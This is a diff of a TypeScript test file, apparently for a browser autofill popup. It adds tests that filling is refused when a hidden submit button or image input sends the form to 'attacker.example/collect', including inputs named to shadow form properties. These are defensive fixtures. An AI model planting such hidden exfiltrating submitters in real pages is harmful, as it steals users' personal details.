@@ -201,11 +201,14 @@ describe("the popup's fill of a personal detail (ADR 0061)", () => {
 
   it("checks a hidden submitter of the form elsewhere in the page, which Enter would use", async () => {
     // Injected before the form, it is the form's default button: a pressed Enter submits
-    // through it and its `formaction`, though it is not shown. A control named `elements`
-    // does not hide it.
+    // through it and its `formaction`, though it is not shown. Controls named after the
+    // form's properties do not hide it.
     const token = await open(`<button form="extra" type="submit" style="display:none"
       formaction="https://attacker.example/collect">Next</button>${choicePage}`);
-    input("phone").insertAdjacentHTML("afterend", `<input type="hidden" name="elements">`);
+    input("phone").insertAdjacentHTML(
+      "afterend",
+      `<input type="hidden" name="elements"><input type="hidden" name="getRootNode">`,
+    );
     expect(await fill(token)).toEqual({ ok: false });
     expect(input("phone").value).toBe("");
     expect(input("by-phone").checked).toBe(false);
@@ -220,6 +223,43 @@ describe("the popup's fill of a personal detail (ADR 0061)", () => {
     expect(await fill(token)).toEqual({ ok: true });
     expect(input("phone").value).toBe("1234");
     expect(authorize).toHaveBeenCalledWith(expect.objectContaining({ destinations: [] }));
+  });
+
+  // An image input submits its form and can be its default button, though the form's
+  // `elements` leave it out.
+  const image = (formaction: string, form = ` form="extra"`) =>
+    `<input type="image" id="image"${form} formaction="${formaction}" alt="Next" style="display:none">`;
+  const foreign = "https://attacker.example/collect";
+  it.each([
+    ["before the form", `${image(foreign)}${choicePage}`],
+    ["first inside the form", choicePage.replace(`<form id="extra">`, `$&${image(foreign, "")}`)],
+  ])("checks a hidden image input %s, which Enter would use", async (_where, page) => {
+    const token = await open(page);
+    expect(input("image").form?.id).toBe("extra");
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(input("phone").value).toBe("");
+    expect(input("by-phone").checked).toBe(false);
+    expect(authorize).toHaveBeenCalledWith(
+      expect.objectContaining({ destinations: ["https://attacker.example/collect"] }),
+    );
+  });
+
+  it("fills with a hidden image input of the form whose override stays on the page's origin", async () => {
+    const token = await open(`${image("/session")}${choicePage}`);
+    expect(await fill(token)).toEqual({ ok: true });
+    expect(input("phone").value).toBe("1234");
+    expect(authorize).toHaveBeenCalledWith(expect.objectContaining({ destinations: [] }));
+  });
+
+  it("fills nothing when an image input of the form is added during the authorization wait", async () => {
+    const token = await open();
+    authorize.mockImplementationOnce(async () => {
+      document.body.insertAdjacentHTML("afterbegin", image(foreign));
+      return true;
+    });
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(input("phone").value).toBe("");
+    expect(input("by-phone").checked).toBe(false);
   });
 
   it("fills nothing when a submitter of the form is added during the authorization wait", async () => {
